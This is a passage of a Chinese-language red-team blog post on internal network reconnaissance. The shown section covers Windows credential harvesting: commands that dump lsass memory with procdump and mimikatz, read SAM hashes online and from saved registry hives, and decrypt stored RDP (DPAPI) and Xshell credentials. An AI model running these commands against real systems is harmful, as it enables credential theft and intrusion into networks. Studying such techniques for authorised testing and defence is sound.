+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">procdump.exe -accepteula -ma lsass.exe lsass.dmp	<span class="token comment"># 将lsass.exe的进程转储</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2）离线读取</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"sekurlsa:minidump lsass.dmp"</span> <span class="token string">"sekurlsa::logonpasswords full"</span> <span class="token builtin class-name">exit</span>
+<span class="token comment"># sekurlsa:minidump lsass.dmp，加载内存文件</span>
+<span class="token comment"># sekurlsa::logonpasswords full，导出凭据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3><span id="mimikatz在线读取sam">mimikatz在线读取SAM</span></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"token::elevate"</span> <span class="token string">"lsadump::sam"</span> <span class="token builtin class-name">exit</span>
+<span class="token comment"># privilege::debug，提升至DebugPrivilege权限</span>
+<span class="token comment"># token::elevate，提升至SYSTEM权限</span>
+<span class="token comment"># lsadump::sam，读取本地SAM文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>读取SAM文件中保存的用户登录凭据，可以导出当期系统中所有本地用户的哈希值。</p>
+<h3><span id="mimikatz离线读取sam">mimikatz离线读取SAM</span></h3><p>将SAM导出。Windows对SAM文件使用密码进行加密，秘钥就存在同目录下的SYSTEM文件。所以需要导出SAM和SYSTEM。<br>系统在运行时，这两个文件是被锁定的，所以需要借助工具导出。<br>1）PowerSploit项目的Invoke-NinjaCopy.ps1：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Invoke-NinjaCopy -Path <span class="token string">"C:\Windows\System32<span class="token entity" title="\c">\c</span>onfig\SAM"</span> -LocalDestination C:<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>SAM
+Invoke-NinjaCopy -Path <span class="token string">"C:\Windows\System32<span class="token entity" title="\c">\c</span>onfig\SYSTEM"</span> -LocalDestination C:<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>2）在管理员权限下，通过保存注册表导出</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reg save HKLM<span class="token punctuation">\</span>SAM sam.hive
+reg save HKLM<span class="token punctuation">\</span>SYSTEM system.hive
+
+mimikatz.exe <span class="token string">"lsadump::sam /sam::sam.hive /system::system.hive"</span> <span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2><span id="获取应用软件凭据">获取应用软件凭据</span></h2><h3><span id="rdp">RDP</span></h3><p>当用户勾选了保存rdp连接凭据，这些凭据都以加密的形式存储在Windows的凭据管理器中。路径：<code>%USERPROFILE%\AppData\Local\Microsoft\Credentials</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmdkey /list	<span class="token comment">#查看当前保存的凭据</span>
+<span class="token function">dir</span> %USERPROFILE%<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Credentials	<span class="token comment">#遍历Credentials下的凭据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><code>Credentials</code>下的凭据是加密的，使用mimikatz导出。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\凭据名"</span> <span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>将会解析这个票据，得到几个字段：guidMasterKey、pbData</p>
+<blockquote>
+<p>guidMasterKey是该票据的guid；pbData是票据加密后的值</p>
+</blockquote>
+<p>记录guidMasterKey的值，执行：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::dpapi"</span> <span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>找到对应的guidMasterKey，找到其的MasterKey，这个MasterKey就是加密凭据用的秘钥。<br>记录MasterKey的值。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\&lt;凭据名>/masterket:&lt;MasterKey的值>"</span> /exit
+<span class="token comment"># 修改&lt;>内的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3><span id="xshell">Xshell</span></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SharpDecryptPwd.exe -Xmangager -p <span class="token string">"%USERPROFILE%\Documents\NetSarang Computer<span class="token entity" title="\6">\6</span>\Xshell\Sessions"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">本机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">域内</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">内网资源探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">发现存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.1.</span> <span class="toc-text">1、ICMP协议-网络层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.2.</span> <span class="toc-text">2、NetBIOS协议-会话层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.3.</span> <span class="toc-text">3、UDP协议-传输层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.4.</span> <span class="toc-text">4、ARP协议-网络层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.5.</span> <span class="toc-text">5、SMB协议-应用层</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">内网端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.1.</span> <span class="toc-text">1、Telnet 探测端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.2.</span> <span class="toc-text">2、nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.3.</span> <span class="toc-text">3、利用PowerShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">MetaSploit探测内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">获取端口Banner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.1.</span> <span class="toc-text">1、NetCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.2.</span> <span class="toc-text">2、Telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.3.</span> <span class="toc-text">3、Nmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">用户凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">获取单机密码和哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.1.</span> <span class="toc-text">mimikatz在线读取lsass进程内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.2.</span> <span class="toc-text">mimikatz离线读取lsass进程内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.3.</span> <span class="toc-text">mimikatz在线读取SAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.1.4.</span> <span class="toc-text">mimikatz离线读取SAM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">获取应用软件凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.1.</span> <span class="toc-text">RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.2.2.</span> <span class="toc-text">Xshell</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&text=内网信息搜集"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&is_video=false&description=内网信息搜集"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网信息搜集&body=Check out this article: https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&title=内网信息搜集"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&name=内网信息搜集&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/12/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/&t=内网信息搜集"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    killeveee
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
